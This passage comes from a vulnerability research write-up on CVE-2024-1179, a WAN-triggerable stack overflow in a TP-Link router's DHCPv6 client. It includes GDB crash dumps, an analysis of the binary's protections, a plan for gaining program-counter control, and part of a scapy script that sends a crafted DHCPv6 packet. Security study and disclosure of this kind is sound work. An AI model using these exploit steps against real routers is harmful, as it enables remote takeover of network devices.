</span></span><span style=display:flex><span>[ Legend:  Code <span style=color:#f92672>|</span> Heap <span style=color:#f92672>|</span> Stack <span style=color:#f92672>|</span> Writable <span style=color:#f92672>|</span> ReadOnly <span style=color:#f92672>|</span> None <span style=color:#f92672>|</span> RWX ]
</span></span><span style=display:flex><span>Start      End        Size       Offset     Perm Path
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x7ffde000</span> <span style=color:#ae81ff>0x7ffff000</span> <span style=color:#ae81ff>0x00021000</span> <span style=color:#ae81ff>0x00000000</span> rw<span style=color:#f92672>-</span> [stack]  <span style=color:#f92672>&lt;-</span>  <span style=color:#960050;background-color:#1e0010>$</span>v0, <span style=color:#960050;background-color:#1e0010>$</span>a0, <span style=color:#960050;background-color:#1e0010>$</span>a1, <span style=color:#960050;background-color:#1e0010>$</span>t2, <span style=color:#960050;background-color:#1e0010>$</span>s0, <span style=color:#960050;background-color:#1e0010>$</span>s1, <span style=color:#960050;background-color:#1e0010>$</span>sp
</span></span><span style=display:flex><span><span style=color:#a6e22e>Offset</span> (from mapped)<span style=color:#f92672>:</span>  <span style=color:#ae81ff>0x7ffde000</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x20b94</span>
</span></span></code></pre></div><p>The problem here is that the <code>memcpy</code> does the copy until the size to copy is <code>0</code> (we hit the end of payload or the <code>\x00</code> is explicitly specified in the payload). And since the destination buffer is on stack and has fixed length it will cause a stack overflow and we can overwrite some variables and pointers on stack. This is the vulnerability. Let&rsquo;s hit continue in gdb and see what happens. As expected, we have a segfault.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>gef<span style=color:#f92672>&gt;</span> c
</span></span><span style=display:flex><span>Continuing.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Program received signal SIGSEGV, Segmentation fault.
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x00402f0f</span> in <span style=color:#f92672>??</span> ()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[ Legend: Modified <span style=color:#66d9ef>register</span> <span style=color:#f92672>|</span> Code <span style=color:#f92672>|</span> Heap <span style=color:#f92672>|</span> Stack <span style=color:#f92672>|</span> Writable <span style=color:#f92672>|</span> ReadOnly <span style=color:#f92672>|</span> None <span style=color:#f92672>|</span> RWX <span style=color:#f92672>|</span> String ]
</span></span><span style=display:flex><span><span style=color:#f92672>---------------------------------------------------------------------------------------------------------------------</span> registers <span style=color:#f92672>----</span>
</span></span><span style=display:flex><span>warning: GDB can<span style=color:#960050;background-color:#1e0010>&#39;</span>t find the start of the function at <span style=color:#ae81ff>0x402f0f</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    GDB is unable to find the start of the function at <span style=color:#ae81ff>0x402f0f</span>
</span></span><span style=display:flex><span>and thus can<span style=color:#960050;background-color:#1e0010>&#39;</span>t determine the size of that function<span style=color:#960050;background-color:#1e0010>&#39;</span>s stack frame.
</span></span><span style=display:flex><span>This means that GDB may be unable to access that stack frame, or
</span></span><span style=display:flex><span>the frames below it.
</span></span><span style=display:flex><span>    This problem is most likely caused by an invalid program counter or
</span></span><span style=display:flex><span>stack pointer.
</span></span><span style=display:flex><span>    However, <span style=color:#66d9ef>if</span> you think GDB should simply search farther back
</span></span><span style=display:flex><span>from <span style=color:#ae81ff>0x402f0f</span> <span style=color:#66d9ef>for</span> code which looks like the beginning of a
</span></span><span style=display:flex><span>function, you can increase the range of the search using the <span style=color:#960050;background-color:#1e0010>`</span>set
</span></span><span style=display:flex><span>heuristic<span style=color:#f92672>-</span>fence<span style=color:#f92672>-</span>post<span style=color:#960050;background-color:#1e0010>&#39;</span> command.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>zero<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r0   : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>at<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r1     : <span style=color:#ae81ff>0x7fffe7fa</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x000477e2</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>v0<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r2     : <span style=color:#ae81ff>0x0090f3e9</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>v1<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r3     : <span style=color:#ae81ff>0x61616161</span> (<span style=color:#960050;background-color:#1e0010>&#39;</span>aaaa<span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>?</span>)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>a0<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r4     : <span style=color:#ae81ff>0xe9f39002</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>a1<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r5     : <span style=color:#ae81ff>0x7fffe7f9</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x0477e261</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>a2<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r6     : <span style=color:#ae81ff>0x00000001</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>a3<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r7     : <span style=color:#ae81ff>0x00000010</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t0<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r8     : <span style=color:#ae81ff>0x00000001</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t1<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r9     : <span style=color:#ae81ff>0x0000000d</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t2<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r10    : <span style=color:#ae81ff>0x7fffec8c</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x61616161</span> <span style=color:#960050;background-color:#1e0010>&#39;</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<span style=color:#960050;background-color:#1e0010>&#39;</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t3<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r11    : <span style=color:#ae81ff>0x61000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t4<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r12    : <span style=color:#ae81ff>0x87e91de4</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t5<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r13    : <span style=color:#ae81ff>0x780052c0</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t6<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r14    : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t7<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r15    : <span style=color:#ae81ff>0x6e6f6974</span> (<span style=color:#960050;background-color:#1e0010>&#39;</span>tion<span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>?</span>)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s0<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r16    : <span style=color:#ae81ff>0x00413070</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x65766461</span> <span style=color:#960050;background-color:#1e0010>&#39;</span>advertise<span style=color:#960050;background-color:#1e0010>&#39;</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s1<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r17    : <span style=color:#ae81ff>0x7fffe5e8</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0xe9f39002</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s2<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r18    : <span style=color:#ae81ff>0x00000005</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s3<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r19    : <span style=color:#ae81ff>0x004018b1</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x0064f2f0</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s4<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r20    : <span style=color:#ae81ff>0x77ffb000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s5<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r21    : <span style=color:#ae81ff>0x77ffb000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s6<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r22    : <span style=color:#ae81ff>0x77ffe518</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x77f5b000</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x464c457f</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s7<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r23    : <span style=color:#ae81ff>0x77fffd8c</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x00000001</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t8<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r24    : <span style=color:#ae81ff>0x0042a0d0</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x77faf6f0</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x7c0410a0</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t9<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r25    : <span style=color:#ae81ff>0x77faf6f0</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x7c0410a0</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>k0<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r26    : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>k1<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r27    : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>gp<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r28    : <span style=color:#ae81ff>0x780052c0</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>sp<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r29    : <span style=color:#ae81ff>0x7fffe1c8</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x7fffe5ec</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x0e000200</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>fp<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>s8<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r30: <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>ra<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r31    : <span style=color:#ae81ff>0x00402f05</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x6cb304f6</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>sr         : <span style=color:#ae81ff>0x0000a413</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>lo         : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>hi         : <span style=color:#ae81ff>0x00000006</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>bad        : <span style=color:#ae81ff>0x61616169</span> (<span style=color:#960050;background-color:#1e0010>&#39;</span>iaaa<span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>?</span>)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>cause      : <span style=color:#ae81ff>0x10800010</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>fsr        : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>fir        : <span style=color:#ae81ff>0x00739300</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>pc         : <span style=color:#ae81ff>0x00402f0f</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x6e202e9b</span>
</span></span><span style=display:flex><span><span style=color:#f92672>-------------------------------------------------------------------------------------------------------------------------</span> stack <span style=color:#f92672>----</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>$</span>sp  <span style=color:#ae81ff>0x7fffe1c8</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>0x0000</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>000</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>0x7fffe5ec</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x0e000200</span>
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>0x7fffe1cc</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>0x0004</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>001</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>0x7fffe7fa</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x000477e2</span>  <span style=color:#f92672>&lt;-</span>  <span style=color:#960050;background-color:#1e0010>$</span>at
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>0x7fffe1d0</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>0x0008</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>002</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>0x004124cc</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x65636572</span> <span style=color:#960050;background-color:#1e0010>&#39;</span>receive <span style=color:#f92672>%</span>s from <span style=color:#f92672>%</span>s on <span style=color:#f92672>%</span>s<span style=color:#960050;background-color:#1e0010>&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>0x7fffe1d4</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>0x000c</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>003</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>0x00413070</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x65766461</span> <span style=color:#960050;background-color:#1e0010>&#39;</span>advertise<span style=color:#960050;background-color:#1e0010>&#39;</span>  <span style=color:#f92672>&lt;-</span>  <span style=color:#960050;background-color:#1e0010>$</span>s0
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>0x7fffe1d8</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>0x0010</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>004</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>0x0042ad62</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x30386566</span> <span style=color:#960050;background-color:#1e0010>&#39;</span>fe80<span style=color:#f92672>::</span><span style=color:#ae81ff>542</span>b:<span style=color:#ae81ff>76</span>ce:<span style=color:#ae81ff>631</span>b:<span style=color:#ae81ff>36</span>ce<span style=color:#f92672>%</span>eth0<span style=color:#960050;background-color:#1e0010>&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>0x7fffe1dc</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>0x0014</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>005</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>0x0042bfc0</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x30687465</span> <span style=color:#960050;background-color:#1e0010>&#39;</span>eth0<span style=color:#960050;background-color:#1e0010>&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>0x7fffe1e0</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>0x0018</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>006</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>0x7fffe1e4</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>0x001c</span><span style=color:#f92672>|+</span><span style=color:#ae81ff>007</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#f92672>------------------------------------------------------------------------------------------------------------------</span> code:mips:<span style=color:#ae81ff>32</span> <span style=color:#f92672>----</span>
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x402f03</span> <span style=color:#ae81ff>6580</span>                <span style=color:#f92672>&lt;</span>NO_SYMBOL<span style=color:#f92672>&gt;</span>   nop     
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x402f05</span> f604b36c            <span style=color:#f92672>&lt;</span>NO_SYMBOL<span style=color:#f92672>&gt;</span>   lw     v1, <span style=color:#ae81ff>0x403588</span> 
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x402f09</span> ea81                <span style=color:#f92672>&lt;</span>NO_SYMBOL<span style=color:#f92672>&gt;</span>   and    v0, v1 
</span></span><span style=display:flex><span> <span style=color:#f92672>-&gt;</span> <span style=color:#ae81ff>0x402f0f</span> <span style=color:#ae81ff>9</span>b2e                <span style=color:#f92672>&lt;</span>NO_SYMBOL<span style=color:#f92672>&gt;</span>   lw     s0, <span style=color:#ae81ff>8</span> (v1) 
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x402f11</span> <span style=color:#ae81ff>206</span>e                <span style=color:#f92672>&lt;</span>NO_SYMBOL<span style=color:#f92672>&gt;</span>   beqz   s0, <span style=color:#ae81ff>0x402f6f</span> 
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x402f13</span> <span style=color:#ae81ff>986</span>a                <span style=color:#f92672>&lt;</span>NO_SYMBOL<span style=color:#f92672>&gt;</span>   lw     v1, <span style=color:#ae81ff>56</span> (s0) 
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x402f15</span> ea30                <span style=color:#f92672>&lt;</span>NO_SYMBOL<span style=color:#f92672>&gt;</span>   cmp    v0, v1 
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x402f17</span> <span style=color:#ae81ff>6000</span>                <span style=color:#f92672>&lt;</span>NO_SYMBOL<span style=color:#f92672>&gt;</span>   bteqz  <span style=color:#ae81ff>0x402f79</span> 
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x402f19</span> <span style=color:#ae81ff>98f</span>a                <span style=color:#f92672>&lt;</span>NO_SYMBOL<span style=color:#f92672>&gt;</span>   lw     s0, <span style=color:#ae81ff>0</span> (s0) 
</span></span><span style=display:flex><span><span style=color:#f92672>-----------------------------------------------------------------------------------------------------------------------</span> threads <span style=color:#f92672>----</span>
</span></span><span style=display:flex><span>[Thread Id:<span style=color:#ae81ff>1</span>, tid:<span style=color:#ae81ff>3103</span>] stopped at <span style=color:#ae81ff>0x00402f0f</span> <span style=color:#f92672>&lt;</span>NO_SYMBOL<span style=color:#f92672>&gt;</span>, reason: SIGSEGV
</span></span><span style=display:flex><span><span style=color:#f92672>-------------------------------------------------------------------------------------------------------------------------</span> trace <span style=color:#f92672>----</span>
</span></span><span style=display:flex><span><span style=color:#f92672>-&gt;</span> [<span style=color:#960050;background-color:#1e0010>#</span><span style=color:#ae81ff>0</span>] <span style=color:#ae81ff>0x00402f0f</span> <span style=color:#f92672>&lt;</span>NO_SYMBOL<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>---------------------------------</span>
</span></span></code></pre></div><p>The program crashes when trying to execute <code>lw s0, 8(v1)</code>. When looking at <code>v1</code>, we can see that it has been overwritten with <code>aaaa</code>. And the loading of that invalid address causes the crash.
Now we have a crash we are pretty sure that there is a buffer overflow vulnerability in this function.</p><h3 id=impact>Impact<a href=#impact class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>This vulnerability creates a critical security exposure at a network infrastructure level, potentially allowing attackers to:</p><ul><li>Gain a Remote code execution on the router</li><li>Pivot into the LAN network</li><li>Intercept, modify, or redirect network communications</li><li>Establish persistence within the network infrastructure</li><li>Access internal network segments from external positions (as the vulnerability is triggered when attempts to get an IPv6 address from DHCP server i.e it is triggered from WAN side)</li><li>Use the router in botnet network</li><li>etc&mldr;</li></ul><h2 id=exploitation-path--proof-of-concept-poc>Exploitation Path / Proof of Concept (PoC)<a href=#exploitation-path--proof-of-concept-poc class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><h3 id=get-control-over-program-counter-pc>Get control over program counter (pc)<a href=#get-control-over-program-counter-pc class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>Now let&rsquo;s check the protection in place:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030164015.png><figcaption><h4></h4></figcaption></figure><p>Canary is disabled so we can freely overwrite a return address. No PIE (Position Independent Executable) means that the binary load address is known and is fixed for all execution. No RELRO (RElocation Read-Only) means that the GOT(Global Offset Table is writable). NX(Non eXecutable) is enabled means that the stack is not executable i.e. we cannot just put a shellcode on the stack and jump to it. Let&rsquo;s check if ASLR (Address Space Layout Randomization) is enabled.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241101114604.png><figcaption><h4></h4></figcaption></figure><p>A value of <code>2</code> means that full ASLR is enabled, which means that the base addresses of the stack, heap, and libraries are randomized for each execution and we could not easily guess them.
With all this setup, to successfully exploit this binary, we need to craft a ROP chain.</p><p>No let&rsquo;s go back to our function. We saw earlier that there is a crash, but the program counter <code>pc</code> is not already under our control. We also noticed that the crash occurs in the binary. This means that there is crash somewhere before the function returns and thus the control flow cannot yet be hijacked.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030164814.png><figcaption><h4></h4></figcaption></figure><p>Using the source code of the OPNsense Github project, let&rsquo;s revisit the function where the crash occurs (<a href=https://github.com/opnsense/dhcp6c/blob/272dc411f4f19f46eb6ebf136c8d9a7a0837b1f4/dhcp6c.c#L1207><code>client6_recv</code></a> function).</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030165432.png><figcaption><h4></h4></figcaption></figure><p>From previous analysis, we know that <code>optinfo</code> is populated using the <code>memcpy</code> in the<code>dhcp6_get_options</code> functions and <code>optinfo</code> is a struct on the stack. This is the buffer that is overflown. Let&rsquo;s check what other variables are overwritten by this overflow.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030165657.png><figcaption><h4></h4></figcaption></figure><p>Let&rsquo;s now take a look at what happens when the <code>dhcp6_get_options</code> succeeds.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030165902.png><figcaption><h4></h4></figcaption></figure><p>We can quickly find out why the program crashes earlier before the function returns. Indeed, our payload overwrote the stack variables located after <code>optinfo</code>, especially the <code>dh6</code> variable which is used in the <code>switch case</code> that follows the call to <code>dhcp6_get_options</code>. We need to avoid this crash.
The first approach we can take to avoid it is to write a valid pointer into the <code>dh6</code> so that when the programs tries to read <code>dh6->dh6_msgtype</code> it works and then write a <code>msgtype</code> which will let us go to the default case to avoid using our corrupted <code>dh6</code> (the default case only use the <code>dh6->dh6_msgtype</code> to retrieve the message string to print).
The second approach is more quick and straightforward and we don&rsquo;t need to deal with shenanigans pointer. We can see that if <code>dhcp6_get_options</code> return value is less than <code>0</code> (<code>dhcp6_get_options</code> fails to properly parse an option) the function immediately returns. So we just need to find a way to craft an invalid option that will return a value less than <code>0</code>. This will make the function return without crashing. Then, when returning, the saved return address will be popped from the stack. As this value was overwritten with our payload, we will now have control of the program counter <code>pc</code>.
Let&rsquo;s revisit the <a href=https://github.com/opnsense/dhcp6c/blob/272dc411f4f19f46eb6ebf136c8d9a7a0837b1f4/common.c#L1502><code>dhcp6_get_options function</code></a> to see how to construct an invalid options. We can see that for some options, when there is error in the handling, we <code>goto fail</code> or <code>goto malformed</code> and return <code>-1</code> which is less than <code>0</code>.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030174748.png><figcaption><h4></h4></figcaption></figure><p>Let&rsquo;s now find a simple DHCPv6 option that we can quickly make invalid option.
The <code>RAPID_COMMIT</code> option is simple and perfect for our need:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>		<span style=color:#66d9ef>case</span> DH6OPT_RAPID_COMMIT:
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (optlen <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>goto</span> malformed;
</span></span><span style=display:flex><span>			optinfo<span style=color:#f92672>-&gt;</span>rapidcommit <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span></code></pre></div><p>By providing an <code>optlen</code> that is not <code>0</code> , we will go to the malformed label and return <code>-1</code>
Let&rsquo;s use this in our python script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># 14=0xe = RAPID_COMMIT, normally len should be 0, but we want to trigger an error so voila</span>
</span></span><span style=display:flex><span>code <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00\x0e</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> (<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x01</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>rapid_commit_option <span style=color:#f92672>=</span> code <span style=color:#f92672>+</span> (len(payload))<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>2</span>, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>) <span style=color:#f92672>+</span> payload
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Combine all layers and send packet</span>
</span></span><span style=display:flex><span>pck <span style=color:#f92672>=</span> ethernet_layer <span style=color:#f92672>/</span> ipv6_layer <span style=color:#f92672>/</span> udp_layer <span style=color:#f92672>/</span> dhcp6_advertise <span style=color:#f92672>/</span> server_id <span style=color:#f92672>/</span> client_id <span style=color:#f92672>/</span> aftr_name_option <span style=color:#f92672>/</span> rapid_commit_option
</span></span><span style=display:flex><span>print(pck)
</span></span><span style=display:flex><span>sendp(pck, iface<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;br0&#34;</span>, verbose<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
